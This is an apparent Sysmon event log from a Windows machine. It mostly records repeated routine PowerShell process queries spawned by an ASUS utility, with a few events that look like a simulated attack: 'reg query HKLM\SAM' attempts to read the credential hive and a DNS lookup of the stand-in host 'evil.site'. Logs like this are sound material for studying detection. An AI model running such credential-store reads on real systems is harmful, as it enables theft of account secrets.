+UtcTime: 2025-07-20 21:20:33.458
+ProcessGuid: {7f6f9216-5da1-687d-4709-000000006901}
+ProcessId: 2212
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_a5pn2fkd.v2u.ps1
+CreationUtcTime: 2025-07-20 21:20:33.458
+User: SHARON\Shxro"
+"20/07/2025 22:20:33","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 21:20:33.384
+ProcessGuid: {7f6f9216-5da1-687d-4709-000000006901}
+ProcessId: 2212
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 22:20:03","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 21:20:03.455
+ProcessGuid: {7f6f9216-5d83-687d-4109-000000006901}
+ProcessId: 26348
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_0afpv1cg.5tw.ps1
+CreationUtcTime: 2025-07-20 21:20:03.455
+User: SHARON\Shxro"
+"20/07/2025 22:20:03","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 21:20:03.383
+ProcessGuid: {7f6f9216-5d83-687d-4109-000000006901}
+ProcessId: 26348
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 22:19:33","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 21:19:33.453
+ProcessGuid: {7f6f9216-5d65-687d-3f09-000000006901}
+ProcessId: 4800
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_gwj42hve.afj.ps1
+CreationUtcTime: 2025-07-20 21:19:33.453
+User: SHARON\Shxro"
+"20/07/2025 22:19:33","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 21:19:33.380
+ProcessGuid: {7f6f9216-5d65-687d-3f09-000000006901}
+ProcessId: 4800
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 22:19:03","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 21:19:03.453
+ProcessGuid: {7f6f9216-5d47-687d-3d09-000000006901}
+ProcessId: 22132
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_4lbz4ara.0j5.ps1
+CreationUtcTime: 2025-07-20 21:19:03.453
+User: SHARON\Shxro"
+"20/07/2025 22:19:03","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 21:19:03.379
+ProcessGuid: {7f6f9216-5d47-687d-3d09-000000006901}
+ProcessId: 22132
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 22:18:33","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 21:18:33.446
+ProcessGuid: {7f6f9216-5d29-687d-3b09-000000006901}
+ProcessId: 10052
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_mvmblxbt.h1i.ps1
+CreationUtcTime: 2025-07-20 21:18:33.446
+User: SHARON\Shxro"
+"20/07/2025 22:18:33","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 21:18:33.370
+ProcessGuid: {7f6f9216-5d29-687d-3b09-000000006901}
+ProcessId: 10052
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 22:18:33","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 21:18:33.087
+ProcessGuid: {7f6f9216-5d29-687d-3a09-000000006901}
+ProcessId: 25352
+Image: C:\Windows\System32\reg.exe
+FileVersion: 10.0.22621.1 (WinBuild.160101.0800)
+Description: Registry Console Tool
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: reg.exe
+CommandLine: ""C:\Windows\system32\reg.exe"" query HKLM\SAM
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=CDB58D0BCABE76AFC60428F364834463,SHA256=411AE446FE37B30C0727888C7FA5E88994A46DAFD41AA5B3B06C9E884549AFDE,IMPHASH=1085BD82B37A225F6D356012D2E69C3D
+ParentProcessGuid: {7f6f9216-59cc-687d-d008-000000006901}
+ParentProcessId: 12256
+ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
+ParentUser: SHARON\Shxro"
+"20/07/2025 22:18:09","3","Network connection detected:
+RuleName: -
+UtcTime: 2025-07-20 21:18:07.056
+ProcessGuid: {7f6f9216-59cc-687d-d008-000000006901}
+ProcessId: 12256
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+User: SHARON\Shxro
+Protocol: tcp
+Initiated: true
+SourceIsIpv6: false
+SourceIp: 192.168.1.128
+SourceHostname: Sharon.lan
+SourcePort: 52917
+SourcePortName: -
+DestinationIsIpv6: false
+DestinationIp: 13.107.246.64
+DestinationHostname: -
+DestinationPort: 443
+DestinationPortName: https"
+"20/07/2025 22:18:03","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 21:18:03.440
+ProcessGuid: {7f6f9216-5d0b-687d-3609-000000006901}
+ProcessId: 20428
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_4mghhiry.0mo.ps1
+CreationUtcTime: 2025-07-20 21:18:03.440
+User: SHARON\Shxro"
+"20/07/2025 22:18:03","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 21:18:03.366
+ProcessGuid: {7f6f9216-5d0b-687d-3609-000000006901}
+ProcessId: 20428
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 22:17:57","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 21:17:57.720
+ProcessGuid: {7f6f9216-5d05-687d-3509-000000006901}
+ProcessId: 3360
+Image: C:\Windows\System32\reg.exe
+FileVersion: 10.0.22621.1 (WinBuild.160101.0800)
+Description: Registry Console Tool
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: reg.exe
+CommandLine: ""C:\Windows\system32\reg.exe"" query HKLM\SAM
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=CDB58D0BCABE76AFC60428F364834463,SHA256=411AE446FE37B30C0727888C7FA5E88994A46DAFD41AA5B3B06C9E884549AFDE,IMPHASH=1085BD82B37A225F6D356012D2E69C3D
+ParentProcessGuid: {7f6f9216-59cc-687d-d008-000000006901}
+ParentProcessId: 12256
+ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
+ParentUser: SHARON\Shxro"
+"20/07/2025 22:17:33","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 21:17:33.431
+ProcessGuid: {7f6f9216-5ced-687d-3309-000000006901}
+ProcessId: 5596
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_zzhfggxc.4om.ps1
+CreationUtcTime: 2025-07-20 21:17:33.431
+User: SHARON\Shxro"
+"20/07/2025 22:17:33","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 21:17:33.358
+ProcessGuid: {7f6f9216-5ced-687d-3309-000000006901}
+ProcessId: 5596
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 22:17:03","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 21:17:03.415
+ProcessGuid: {7f6f9216-5ccf-687d-3109-000000006901}
+ProcessId: 9904
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_m1jafgvo.444.ps1
+CreationUtcTime: 2025-07-20 21:17:03.415
+User: SHARON\Shxro"
+"20/07/2025 22:17:03","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 21:17:03.343
+ProcessGuid: {7f6f9216-5ccf-687d-3109-000000006901}
+ProcessId: 9904
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 22:16:33","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 21:16:33.405
+ProcessGuid: {7f6f9216-5cb1-687d-2f09-000000006901}
+ProcessId: 26412
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_20oxark0.ywv.ps1
+CreationUtcTime: 2025-07-20 21:16:33.404
+User: SHARON\Shxro"
+"20/07/2025 22:16:33","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 21:16:33.329
+ProcessGuid: {7f6f9216-5cb1-687d-2f09-000000006901}
+ProcessId: 26412
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 22:16:03","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 21:16:03.399
+ProcessGuid: {7f6f9216-5c93-687d-2a09-000000006901}
+ProcessId: 27312
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_oehor3my.xem.ps1
+CreationUtcTime: 2025-07-20 21:16:03.398
+User: SHARON\Shxro"
+"20/07/2025 22:16:03","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 21:16:03.325
+ProcessGuid: {7f6f9216-5c93-687d-2a09-000000006901}
+ProcessId: 27312
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 22:15:33","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 21:15:33.557
+ProcessGuid: {7f6f9216-5c75-687d-2809-000000006901}
+ProcessId: 8548
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_3s3a0jyp.egu.ps1
+CreationUtcTime: 2025-07-20 21:15:33.557
+User: SHARON\Shxro"
+"20/07/2025 22:15:33","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 21:15:33.316
+ProcessGuid: {7f6f9216-5c75-687d-2809-000000006901}
+ProcessId: 8548
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 22:15:03","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 21:15:03.392
+ProcessGuid: {7f6f9216-5c57-687d-2609-000000006901}
+ProcessId: 27688
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_0xyylzmm.152.ps1
+CreationUtcTime: 2025-07-20 21:15:03.392
+User: SHARON\Shxro"
+"20/07/2025 22:15:03","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 21:15:03.304
+ProcessGuid: {7f6f9216-5c57-687d-2609-000000006901}
+ProcessId: 27688
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 22:14:33","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 21:14:33.376
+ProcessGuid: {7f6f9216-5c39-687d-2409-000000006901}
+ProcessId: 28348
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_bubc2ga5.gis.ps1
+CreationUtcTime: 2025-07-20 21:14:33.375
+User: SHARON\Shxro"
+"20/07/2025 22:14:33","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 21:14:33.295
+ProcessGuid: {7f6f9216-5c39-687d-2409-000000006901}
+ProcessId: 28348
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 22:14:33","22","Dns query:
+RuleName: -
+UtcTime: 2025-07-20 21:14:31.110
+ProcessGuid: {7f6f9216-59cc-687d-d008-000000006901}
+ProcessId: 12256
+QueryName: evil.site
+QueryStatus: 9003
+QueryResults: -
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+User: SHARON\Shxro"
+"20/07/2025 22:14:12","22","Dns query:
+RuleName: -
+UtcTime: 2025-07-20 21:14:10.534
+ProcessGuid: {7f6f9216-59cc-687d-d008-000000006901}
+ProcessId: 12256
+QueryName: download.sysinternals.com
+QueryStatus: 0
+QueryResults: type: 5 si-bxgtbkdmcjcydmfm.b01.azurefd.net;type: 5 shed.dual-low.s-part-0036.t-0009.t-msedge.net;type: 5 s-part-0036.t-0009.t-msedge.net;::ffff:13.107.246.64;
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+User: SHARON\Shxro"
+"20/07/2025 22:14:12","3","Network connection detected:
+RuleName: -
+UtcTime: 2025-07-20 21:14:10.550
+ProcessGuid: {7f6f9216-59cc-687d-d008-000000006901}
+ProcessId: 12256
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+User: SHARON\Shxro
+Protocol: tcp
+Initiated: true
+SourceIsIpv6: false
+SourceIp: 192.168.1.128
+SourceHostname: Sharon.lan
+SourcePort: 52903
+SourcePortName: -
+DestinationIsIpv6: false
+DestinationIp: 13.107.246.64
+DestinationHostname: -
+DestinationPort: 443
+DestinationPortName: https"
+"20/07/2025 22:14:03","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 21:14:03.355
+ProcessGuid: {7f6f9216-5c1b-687d-1f09-000000006901}
+ProcessId: 5680
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_xjprml0l.q51.ps1
+CreationUtcTime: 2025-07-20 21:14:03.355
+User: SHARON\Shxro"
+"20/07/2025 22:14:03","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 21:14:03.281
+ProcessGuid: {7f6f9216-5c1b-687d-1f09-000000006901}
+ProcessId: 5680
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
